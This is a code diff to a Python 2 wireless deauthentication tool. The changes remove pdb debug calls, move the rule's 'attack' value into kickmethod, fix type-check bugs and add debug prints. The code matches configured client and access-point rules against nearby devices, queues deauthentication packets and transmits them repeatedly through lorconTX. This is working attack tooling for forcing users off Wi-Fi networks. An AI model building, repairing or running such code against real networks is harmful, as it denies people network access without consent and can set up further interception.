@@ -119,9 +119,10 @@ class messages:
 class Rule:
     # The client or AP rule is the input to this class
     def __init__(self, rule):
-        pdb.set_trace()
         self.rule = rule
         anymatch = recompile('any', IGNORECASE)
+        self.kickmethod = rule['attack']
+        del rule['attack']
         for key in rule.keys():
             try:
                 # Note there could be a bug here if it doesn't get named the same in client obj.
@@ -130,11 +131,11 @@ class Rule:
                     self.companymatch = recompile(rule[key]+".*", IGNORECASE)
                 if anymatch.match(rule[key]):
                     self.any = True
-                if key == "kickmethod":
-                    self.kickmethod = rule[key]
-                    del rule[key]
-            except:
+                else:
+                    self.any = False 
+            except Exception, e:
                 print "We handled an error related to lists in the rule -- it's OK.  We know about it."
+                print e
 
     def match(self, obj):
         # There will need to be error handling here for if you try to compare a client to an AP rule or vice versa
@@ -142,12 +143,14 @@ class Rule:
         for key in obj_attributes.keys():
             try:
                 # If it says any in the rule, realize that and drop it
-                if any:
+                if self.any:
                     result = True
                 # Company Name Match
-                if key == "company":
+                #todo == if there's a list, treat it properly regardless of if it's company
+                #todo - if it's a range, build a range object
+                elif key == "company":
                     # If it's a list of companies
-                    if isinstance(self.rule[key],type.ListType):
+                    if isinstance(self.rule[key],types.ListType):
                         for item in rule['company']:
                             # Do any items in the list match our object?
                             if self.companymatch.match(item):
@@ -157,7 +160,7 @@ class Rule:
                         result = True
 
                 # Detect Lists
-                elif isinstance(self.rule[key],type.ListType):
+                elif isinstance(self.rule[key],types.ListType):
                     result = obj_attributes[key] in self.rule[key]
                 elif obj_attributes[key] == self.rule[key]:
                     result = True
@@ -206,13 +209,10 @@ class getTargets:
             for key in data.keys():
                 try:
                     rtype = data[key]['type'] # The Type refers to the rule being for clients or access points
-                    attack = data[key]['attack'] # Attack refers to what kind of wireless deauth we will perform                
                 except KeyError, e:
                     print "Looks like you forgot to add %s to your rules."  %(e)
                     sexit(-1)
                 del data[key]['type']
-                del data[key]['attack']
-                pdb.set_trace()
                 if apmatch.match(rtype):
                     ap_rules.append(Rule(data[key]))
                 elif clientmatch.match(rtype):
@@ -223,9 +223,9 @@ class getTargets:
         #self.rules = [ap_rules, client_rules]
         
         # extra copy here can probably remove
-        pdb.set_trace()
-        clientObjs = self.Airv.clientObjects
-        apObjs = self.Airv.apObjects
+        # TODO: make Tool not have a dict setup so we can just pull straight.
+        clientObjs = self.Airv.clientObjects.values()
+        apObjs = self.Airv.apObjects.values()
 
         # match clients in air to kick rules
         self.targets = []
@@ -234,6 +234,7 @@ class getTargets:
                 if clientRule.match(client):
                     client.kickmethod = clientRule.kickmethod
                     self.targets.append(client)
+                    print "---------------------------client---------------------"
         for ap in apObjs:
             for apRule in ap_rules:
                 if apRule.match(ap):
@@ -273,7 +274,7 @@ class Kicker:
             """Get the object type.  Will return "ap" or "client" depending on 
             the spelling of the name of the class in the tool lib"""
             obj.type = obj.__class__.__name__
-            
+            #pdb.set_trace()            
             # OK we need to drop a client, here's the path for that.
             if obj.type == "client":
                 ap = obj.bssid
@@ -284,6 +285,7 @@ class Kicker:
                 channel = ap.channel
                 client_mac = obj.mac
                 bssid = ap.bssid
+                print "channel:" + str(channel) + "mac:" + str(client_mac) + "bssid:" + ap.bssid
 
                 # If it's not a list, make it one
                 if isinstance(kickmethod,types.IntType):
@@ -292,7 +294,9 @@ class Kicker:
                 if kickmethod == 0:
                     kickmethod = [1,2,3,4]
                 # Kick according to attacks in list
+                #pdb.set_trace()
                 if 1 in kickmethod:
+                    print "loaded."
                     packetQue.extend(
                         self.engine.deauthPacketEngine(
                             True, client_mac, bssid, bssid, channel))
@@ -317,12 +321,15 @@ class Kicker:
                     kick[kickmethod]
                     
             elif obj.type == "accessPoint": # I Disagree with this camelcase
+                print "access point dropping is unimplemented"
                 pass # currently unimplemented.  Will hold autoimmune attacks
 
         numPackets = len(packetQue)
         message.printMessage(
             "\nAttempting to TX %i packets %i times each" %(numPackets, packetCount))
+        #pdb.set_trace()
         while len(packetQue) != 0:
+            print "pew"
             self.lorconTX(
                 packetCount, #number of packets to send
                 packetQue[0][0], #packet in hex
@@ -406,6 +413,7 @@ class AdMain:
             while True:
                     Targeting.run()
                     if Targeting.targets != None:
+                        print "num of matches: " + str(len(Targeting.targets))
                         rtnPktCount = daKicker.makeMagic(Targeting.targets, int(args.pnap))
                         if rtnPktCount == 0:
                             message.printMessage(
